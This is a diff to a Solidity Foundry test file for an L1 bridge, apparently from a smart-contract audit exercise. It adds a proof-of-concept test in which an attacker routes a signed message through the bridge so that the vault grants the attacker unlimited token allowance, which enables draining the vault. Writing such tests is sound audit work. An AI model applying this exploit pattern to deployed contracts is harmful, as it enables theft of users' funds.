@@ -261,8 +261,6 @@ contract L1BossBridgeTest is Test {
         emit Deposit(address(vault), attacker, vaultBalance);
         tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
         vm.stopPrank();
-
-        console2.log("vault balance afterr ", token.balanceOf(address(vault)));        
     }
 
     // use nonce or timestamp
@@ -292,4 +290,27 @@ contract L1BossBridgeTest is Test {
         assertEq(token.balanceOf(attacker), initialBalanceAttacker + initialBalanceVault);
         assertEq(token.balanceOf(address(vault)), 0);
     }
+
+    function testCanCallVaultApproveFromBridgeAndDrainVault() public {
+        uint256 initialBalanceVault = 1000 ether;
+        deal(address(token), address(vault), initialBalanceVault);
+
+        address attacker = makeAddr("attacker");
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(msg.sender, address(0), 0);
+        tokenBridge.depositTokensToL2(msg.sender, address(0), 0);
+
+        bytes memory message = abi.encode(
+            address(vault), //target
+            0, // value
+            abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max))
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);
+
+        tokenBridge.sendToL1(v, r, s, message);
+        assertEq(token.allowance(address(vault), attacker), type(uint256).max);
+        vm.stopPrank();
+    }   
 }
